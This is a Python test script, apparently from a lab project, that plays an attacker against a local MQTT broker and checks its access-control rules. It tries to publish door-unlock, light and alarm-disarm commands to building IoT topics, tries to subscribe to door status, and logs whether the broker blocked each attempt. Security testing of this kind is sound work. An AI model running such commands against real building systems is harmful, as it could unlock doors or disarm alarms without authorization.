import time
import json
import requests
import paho.mqtt.client as mqtt

BROKER = "127.0.0.1"
PORT = 1884
USERNAME = "attacker_test"
PASSWORD = "hacker123"
BACKEND_URL = "http://127.0.0.1:5000/api/log_external"

def log_attack(topic, action, reason="ATTEMPT", result="BLOCKED"):
    try:
        requests.post(BACKEND_URL, json={
            "client": USERNAME,
            "topic": topic,
            "action": action,
            "result": result,
            "reason": reason
        })
    except:
        pass

def on_connect(client, userdata, flags, reason_code, properties):
    if reason_code == 0:
        print("[ATTACKER] Connected to MQTT broker (MQTTv5).")
    else:
        print(f"[ATTACKER] Connection failed: {reason_code}")

def on_publish(client, userdata, mid, reason_code, properties):
    if reason_code == 135:
        print("\n[ATTACKER] [X] PUBLISH DENIED by MQTT broker ACL!")
        log_attack(userdata["topic"], "PUBLISH", "MQTT ACL DENIED", "BLOCKED")
    elif reason_code == 0:
        print("\n[ATTACKER] [!] PUBLISH SUCCESSFUL. Broker accepted the message.")
        log_attack(userdata["topic"], "PUBLISH", "LACK OF ACL", "SUCCESS")
    else:
        print(f"\n[ATTACKER] Publish result code: {reason_code}")

print("===========================================")
print("      UNAUTHORIZED MQTT ATTACK TOOL        ")
print("===========================================")

# Using MQTTv5 to receive exact ACL reason codes from the broker
client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id="attacker_script", protocol=mqtt.MQTTv5)
client.username_pw_set(USERNAME, PASSWORD)
# userdata allows us to pass the topic being attacked to the on_publish callback
client.user_data_set({"topic": ""}) 
client.on_connect = on_connect
client.on_publish = on_publish

try:
    client.connect(BROKER, PORT, 60)
    client.loop_start()
except Exception as e:
    print(f"Failed to connect: {e}")
    exit(1)

time.sleep(0.5)

print("\nSelect an attack scenario:")
print("1) Attack A: Unauthorized Door Unlock")
print("2) Attack B: Unauthorized Light Control")
print("3) Attack C: Unauthorized Subscribe to Door Status")
print("4) Attack D: Unauthorized Alarm Disarm")

choice = input("\nEnter choice (1-4): ")

if choice == '1':
    topic = "iot/building/door/command"
    client.user_data_set({"topic": topic})
    payload = json.dumps({"deviceId": "DOOR-001", "command": "UNLOCK"})
    print(f"\n[ATTACKER] Attempting to publish to: {topic}")
    print(f"[ATTACKER] Payload: {payload}")
    
    # QoS 1 is required to receive a PUBACK with the ACL reason code
    msg_info = client.publish(topic, payload, qos=1)
    msg_info.wait_for_publish()
    
elif choice == '2':
    topic = "iot/building/light/command"
    client.user_data_set({"topic": topic})
    payload = json.dumps({"deviceId": "LIGHT-001", "command": "ON"})
    print(f"\n[ATTACKER] Attempting to publish to: {topic}")
    
    msg_info = client.publish(topic, payload, qos=1)
    msg_info.wait_for_publish()
    
elif choice == '4':
    topic = "iot/building/alarm/command"
    client.user_data_set({"topic": topic})
    payload = json.dumps({"deviceId": "ALARM-001", "command": "DISARM"})
    print(f"\n[ATTACKER] Attempting to publish to: {topic}")
    
    msg_info = client.publish(topic, payload, qos=1)
    msg_info.wait_for_publish()
    
elif choice == '3':
    topic = "iot/building/door/status"
    print(f"\n[ATTACKER] Attempting to SUBSCRIBE to: {topic}")
    
    def on_subscribe(client, userdata, mid, reason_codes, properties):
        if reason_codes[0] == 135:
             print("\n[ATTACKER] [X] SUBSCRIBE DENIED by MQTT broker ACL!")
             log_attack(topic, "SUBSCRIBE", "MQTT ACL DENIED", "BLOCKED")
        else:
             print(f"\n[ATTACKER] [!] SUBSCRIBE SUCCESSFUL! Status code: {reason_codes[0]}")
             log_attack(topic, "SUBSCRIBE", "LACK OF ACL", "SUCCESS")
             
    client.on_subscribe = on_subscribe
    client.subscribe(topic, qos=1)
    time.sleep(1) # wait for suback

time.sleep(0.5)
client.disconnect()
